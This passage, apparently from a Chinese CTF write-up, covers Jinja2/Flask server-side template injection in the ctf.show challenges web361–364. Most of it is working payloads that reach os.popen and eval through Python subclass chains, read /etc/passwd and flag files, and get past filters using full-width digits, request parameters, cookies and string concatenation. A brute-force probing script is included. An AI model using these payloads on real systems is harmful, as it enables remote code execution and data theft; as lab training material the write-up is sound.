string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token comment"># 获得第40个子类的一个实例，即一个file实例</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token comment"># 对file初始化</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token builtin">open</span> <span class="token builtin">file</span> <span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span> mode <span class="token string">'r'</span> at <span class="token number">0x10397a8a0</span><span class="token operator">></span><span class="token comment"># 使用file的read属性读取，但发现是个方法</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> method read of <span class="token builtin">file</span> <span class="token builtin">object</span> at <span class="token number">0x10397a5d0</span><span class="token operator">></span><span class="token comment"># 使用read()方法读取</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>nobody<span class="token punctuation">:</span><span class="token operator">*</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span>Unprivileged User<span class="token punctuation">:</span><span class="token operator">/</span>var<span class="token operator">/</span>empty<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>falseroot<span class="token punctuation">:</span><span class="token operator">*</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span>System Administrator<span class="token punctuation">:</span><span class="token operator">/</span>var<span class="token operator">/</span>root<span class="token punctuation">:</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh</code></pre><p>常用过滤器</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：将值转换为<span class="token builtin">int</span>类型；<span class="token builtin">float</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：将值转换为<span class="token builtin">float</span>类型；lower<span class="token punctuation">(</span><span class="token punctuation">)</span>：将字符串转换为小写；upper<span class="token punctuation">(</span><span class="token punctuation">)</span>：将字符串转换为大写；title<span class="token punctuation">(</span><span class="token punctuation">)</span>：把值中的每个单词的首字母都转成大写；capitalize<span class="token punctuation">(</span><span class="token punctuation">)</span>：把变量值的首字母转成大写，其余字母转小写；trim<span class="token punctuation">(</span><span class="token punctuation">)</span>：截取字符串前面和后面的空白字符；wordcount<span class="token punctuation">(</span><span class="token punctuation">)</span>：计算一个长字符串中单词的个数；reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>：字符串反转；replace<span class="token punctuation">(</span>value<span class="token punctuation">,</span>old<span class="token punctuation">,</span>new<span class="token punctuation">)</span>： 替换将old替换为new的字符串；truncate<span class="token punctuation">(</span>value<span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span>killwords<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>：截取length长度的字符串；striptags<span class="token punctuation">(</span><span class="token punctuation">)</span>：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape<span class="token punctuation">(</span><span class="token punctuation">)</span>或e：转义字符，会将<span class="token operator">&lt;</span>、<span class="token operator">></span>等符号转义成HTML中的符号。显例：content<span class="token operator">|</span>escape或content<span class="token operator">|</span>e。safe<span class="token punctuation">(</span><span class="token punctuation">)</span>： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">'&lt;em>hello&lt;/em>'</span><span class="token operator">|</span>safe<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>；<span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：将变量列成列表；string<span class="token punctuation">(</span><span class="token punctuation">)</span>：将变量转换成字符串；join<span class="token punctuation">(</span><span class="token punctuation">)</span>：将一个序列中的参数值拼接成字符串。示例看上面payload；<span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：返回一个数值的绝对值；first<span class="token punctuation">(</span><span class="token punctuation">)</span>：返回一个序列的第一个元素；last<span class="token punctuation">(</span><span class="token punctuation">)</span>：返回一个序列的最后一个元素；<span class="token builtin">format</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>arags<span class="token punctuation">,</span><span class="token operator">*</span>kwargs<span class="token punctuation">)</span>：格式化字符串。比如：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token string">"%s"</span> <span class="token operator">-</span> <span class="token string">"%s"</span><span class="token operator">|</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'Hello?'</span><span class="token punctuation">,</span><span class="token string">"Foo!"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>将输出：Helloo? <span class="token operator">-</span> Foo!length<span class="token punctuation">(</span><span class="token punctuation">)</span>：返回一个序列或者字典的长度；<span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：返回列表内数值的和；sort<span class="token punctuation">(</span><span class="token punctuation">)</span>：返回排序后的列表；default<span class="token punctuation">(</span>value<span class="token punctuation">,</span>default_value<span class="token punctuation">,</span>boolean<span class="token operator">=</span>false<span class="token punctuation">)</span>：如果当前变量没有值，则会使用参数中的值来代替。示例：name<span class="token operator">|</span>default<span class="token punctuation">(</span><span class="token string">'xiaotuo'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>如果name不存在，则会使用xiaotuo来替代。boolean<span class="token operator">=</span><span class="token boolean">False</span>默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean<span class="token operator">=</span>true。也可以使用<span class="token keyword">or</span>来替换。length<span class="token punctuation">(</span><span class="token punctuation">)</span>返回字符串的长度，别名是count</code></pre><p><a href="https://www.freebuf.com/articles/web/328222.html">CTF 对SSTI的一些总结</a></p><h3 id="web361-372"><a href="#web361-372" class="headerlink" title="web361-372"></a>web361-372</h3><h4 id="web361-os-wrap-close"><a href="#web361-os-wrap-close" class="headerlink" title="web361(os._wrap_close)"></a>web361(os._wrap_close)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span>__class__<span class="token operator">.</span>__base__<span class="token operator">.</span><span class="token function">__subclasses__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="web361.png" loading="lazy"></p><p>也可以使用脚本查找</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'https://589fbc1b-7f84-4f77-97bc-d20ad9e2b2b9.challenge.ctf.show/?name=&#123;&#123;%22%22.__class__.__bases__[0].__subclasses__()['</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">']&#125;&#125;'</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'os._wrap_close'</span> <span class="token keyword">in</span> r<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>然后利用<strong>os._wrap_close</strong>类<strong>init.globals</strong>来找os类中的。init初始化，globals全局查找</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span>__class__<span class="token operator">.</span>__base__<span class="token operator">.</span><span class="token function">__subclasses__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'os'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac ../flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>cycler<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token operator">.</span>os<span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token operator">.</span>__class__<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'os'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web362-数字绕过-half2full"><a href="#web362-数字绕过-half2full" class="headerlink" title="web362(数字绕过 half2full)"></a>web362(数字绕过 half2full)</h4><p>经过测试过滤了数字2和3，但是发现可以140-8哈哈哈</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">140</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>有大佬换成了全角数字也可以</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">half2full</span><span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>      full <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">for</span> ch <span class="token keyword">in</span> half<span class="token punctuation">:</span>          <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>              ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xfee0</span><span class="token punctuation">)</span>          <span class="token keyword">elif</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>              ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token keyword">pass</span>          full <span class="token operator">+=</span> ch      <span class="token keyword">return</span> full  t<span class="token operator">=</span><span class="token string">''</span>s<span class="token operator">=</span><span class="token string">"0123456789"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    t<span class="token operator">+=</span><span class="token string">'\''</span><span class="token operator">+</span>half2full<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\','</span><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span>０<span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>１３２<span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>或者使用其他方法</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>x<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment"># x 可以为任意英文字母或字母组合</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web363-引号"><a href="#web363-引号" class="headerlink" title="web363(引号)"></a>web363(引号)</h4><p>过滤了单引号、双引号</p><p><strong>GET传参绕过</strong></p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>os<span class="token operator">&amp;</span>b<span class="token operator">=</span>popen<span class="token operator">&amp;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p><strong>字符串拼接绕过</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'0'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'s'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'p'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'e'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'n'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'t'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'a'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">591</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'c'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">' '</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">853</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'/'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'f'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'l'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'g'</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment"># %2B -> +</span><span class="token comment"># ?name=&#123;&#123;url_for.__globals__['os']&#125;&#125;</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">591</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">853</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment"># ?name=&#123;&#123;url_for.__globals__['os']['popen']('tac /flag')&#125;&#125;</span></code></pre><p><strong>chr拼接</strong></p><p>先找出 chr 函数，同过 chr 拼接</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> <span class="token builtin">chr</span><span class="token operator">=</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">chr</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span>  url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre><p><strong>通过过滤器拼接</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>select<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span></code></pre><h4 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h4><p>多过滤了args，用上一个字符串拼接也可以</p><p>过滤了单双引号，args</p><p>values 可以获取所有参数，从而绕过 args</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>ocean<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>ocean<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p>也可以通过 cookie 绕过</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token 